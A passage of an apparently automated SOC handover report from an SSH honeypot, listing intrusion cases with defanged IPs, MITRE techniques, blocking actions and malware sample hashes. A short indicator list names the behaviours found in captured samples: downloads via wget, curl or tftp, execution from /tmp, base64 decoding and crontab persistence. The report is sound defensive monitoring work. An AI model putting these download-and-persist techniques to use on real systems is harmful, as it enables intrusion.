| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:38:25` | `cowrie.session.connect` |
| `2026-08-20 18:38:26` | `cowrie.client.version` |
| `2026-08-20 18:38:26` | `cowrie.client.kex` |
| `2026-08-20 18:38:29` | `cowrie.login.success` |
| `2026-08-20 18:38:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e719b181647

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 18:39 |
| **Last Seen** | 2026-08-20 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:39:38` | `cowrie.session.connect` |
| `2026-08-20 18:39:38` | `cowrie.client.version` |
| `2026-08-20 18:39:38` | `cowrie.client.kex` |
| `2026-08-20 18:39:39` | `cowrie.login.success` |
| `2026-08-20 18:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f80ecf86e0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 18:39 |
| **Last Seen** | 2026-08-20 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:39:38` | `cowrie.session.connect` |
| `2026-08-20 18:39:38` | `cowrie.client.version` |
| `2026-08-20 18:39:38` | `cowrie.client.kex` |
| `2026-08-20 18:39:39` | `cowrie.login.success` |
| `2026-08-20 18:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad571d80aa90

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:45 |
| **Last Seen** | 2026-08-20 18:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:45:45` | `cowrie.session.connect` |
| `2026-08-20 18:45:45` | `cowrie.client.version` |
| `2026-08-20 18:45:45` | `cowrie.client.kex` |
| `2026-08-20 18:45:47` | `cowrie.login.success` |
| `2026-08-20 18:45:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:45:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 18:45:54` | `cowrie.direct-tcpip.data` |
| `2026-08-20 18:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9765f049e9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 18:46 |
| **Last Seen** | 2026-08-20 18:46 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:46:01` | `cowrie.session.connect` |
| `2026-08-20 18:46:01` | `cowrie.client.version` |
| `2026-08-20 18:46:01` | `cowrie.client.kex` |
| `2026-08-20 18:46:03` | `cowrie.login.success` |
| `2026-08-20 18:46:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db747bcd81f9

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-08-20 18:46 |
| **Last Seen** | 2026-08-20 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:46:59` | `cowrie.session.connect` |
| `2026-08-20 18:47:00` | `cowrie.client.version` |
| `2026-08-20 18:47:00` | `cowrie.client.kex` |
| `2026-08-20 18:47:02` | `cowrie.login.success` |
| `2026-08-20 18:47:03` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daae43ee72a

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-08-20 18:47 |
| **Last Seen** | 2026-08-20 18:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:47:09` | `cowrie.session.connect` |
| `2026-08-20 18:47:10` | `cowrie.client.version` |
| `2026-08-20 18:47:10` | `cowrie.client.kex` |
| `2026-08-20 18:47:12` | `cowrie.login.success` |
| `2026-08-20 18:47:13` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab4fe05a189

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-08-20 18:52 |
| **Last Seen** | 2026-08-20 18:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:52:22` | `cowrie.session.connect` |
| `2026-08-20 18:52:22` | `cowrie.client.version` |
| `2026-08-20 18:52:22` | `cowrie.client.kex` |
| `2026-08-20 18:52:23` | `cowrie.login.success` |
| `2026-08-20 18:52:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53433108250

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-08-20 18:52 |
| **Last Seen** | 2026-08-20 18:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 18:52:29` | `cowrie.session.connect` |
| `2026-08-20 18:52:29` | `cowrie.client.version` |
| `2026-08-20 18:52:29` | `cowrie.client.kex` |
| `2026-08-20 18:52:31` | `cowrie.login.success` |
| `2026-08-20 18:52:32` | `cowrie.direct-tcpip.request` |
| `2026-08-20 18:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **17** | 2026-08-20 16:57 | 2026-08-20 18:49 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `199.45.154[.]121` | **5** | 2026-08-20 18:26 | 2026-08-20 18:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-20 17:18 | 2026-08-20 18:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **3** | 2026-08-20 17:04 | 2026-08-20 17:08 | 4m | 0 | `T1592` | 🟢 LOW |
| `99.254.23[.]54` | **3** | 2026-08-20 17:50 | 2026-08-20 17:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.129.82[.]38` | **2** | 2026-08-20 16:58 | 2026-08-20 16:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.191.43[.]197` | **2** | 2026-08-20 18:34 | 2026-08-20 18:36 | 2m | 0 | `T1592` | 🟢 LOW |
| `186.158.120[.]70` | **2** | 2026-08-20 18:38 | 2026-08-20 18:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.193[.]105` | **2** | 2026-08-20 18:41 | 2026-08-20 18:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]106` | **2** | 2026-08-20 18:03 | 2026-08-20 18:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.212.225[.]99` | 1 | 2026-08-20 18:13 | 2026-08-20 18:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.48.120[.]181` | 1 | 2026-08-20 18:27 | 2026-08-20 18:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `137.175.205[.]63` | 1 | 2026-08-20 18:10 | 2026-08-20 18:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.40.122[.]250` | 1 | 2026-08-20 18:46 | 2026-08-20 18:47 | 14s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-08-20 17:25 | 2026-08-20 17:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.99.187[.]10` | 1 | 2026-08-20 17:29 | 2026-08-20 17:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-08-20 17:18 | 2026-08-20 17:18 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.202.32[.]73` | 1 | 2026-08-20 17:52 | 2026-08-20 17:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-08-20 17:24 | 2026-08-20 17:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]194` | 1 | 2026-08-20 17:12 | 2026-08-20 17:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.163.139[.]198` | 1 | 2026-08-20 18:11 | 2026-08-20 18:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]23` | 1 | 2026-08-20 18:45 | 2026-08-20 18:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-08-20 17:08 | 2026-08-20 17:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-08-20 18:31 | 2026-08-20 18:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-20 18:04 | 2026-08-20 18:05 | 80s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `182.60.128[.]241` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 50 |
| `208.96.233[.]67` | CA | Cogeco Connexion inc | **100** ⚠️ | 50 |
| `102.129.82[.]38` | CG | Net PNR grand public | **100** ⚠️ | 2 |
| `63.47.149[.]59` | US | Verizon Business | **100** ⚠️ | 50 |
| `104.48.120[.]181` | US | AT&T Enterprises, LLC | **100** ⚠️ | 1 |
| `182.139.39[.]150` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `178.178.194[.]128` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `104.236.83[.]40` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 108 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 38 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 38 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 37 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 4 |
| AbuseIPDB score 2 below threshold 25 | 6 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 193 cases |
| Tool 34  | Credential Extractor        | ✅ 131 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (16.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 62 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 19 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 104 priority case(s) shown individually · 25 recon entry/entries in table (10 group(s) consolidating 42 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T20:34:17Z_
